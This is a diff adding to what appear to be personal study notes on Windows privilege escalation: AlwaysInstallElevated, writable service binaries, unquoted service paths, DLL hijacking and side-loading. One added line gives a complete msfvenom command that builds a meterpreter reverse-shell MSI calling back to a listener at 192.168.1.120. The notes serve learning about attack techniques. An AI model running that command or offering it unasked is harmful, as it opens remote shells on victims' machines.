@@ -92,13 +92,16 @@ Usually, at first malware initially runs in the context of a normal user.
     - UAC as in short: by default: process is started without admin privileges. If to run as admin: popup will appear. So user has to actively click and depending on configuration even enter pw. There are some ways to bypass UAC  
 - Some misconfigurations
     - AlwaysInstallElevated: AD Group policies which set to true.. makes the msi's run as admin. (even if user is not yet admin) 
+        - Tool meterpreter can generate msi that creates a shell: "msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 –f msi > shell.msi"  (other tools like PowerUp can do that too)
     - Unattended Installation files (sometimes pw can be found in them)
     - Service binaries that one has write access and will be executed as admin
         - or generally any file that is executed with another user. (would be privilege escalation to another user)
     - Hijack Execution flow
         - if dll use is not immediatly found, windows will search different places to find the place. If attacker has write privileges in one of these places, it is possible to place "infected" dlls there. 
-            - Vulnerability: "Unquoted Service Paths"
+            - Vulnerability: "Unquoted Service Paths" when path/name has whitespaces so windows will look in multiple places
             - path variables (mentioned above)
+    - DDL side loading
+        - similar to dll hijacking.. smuggle in a malicious dll when windows Side-by-Side manifests are not specific enough about which dll to be loaded
     - etc.
     - Tools: 
         - PowerSploit: > collection of powershell scripts
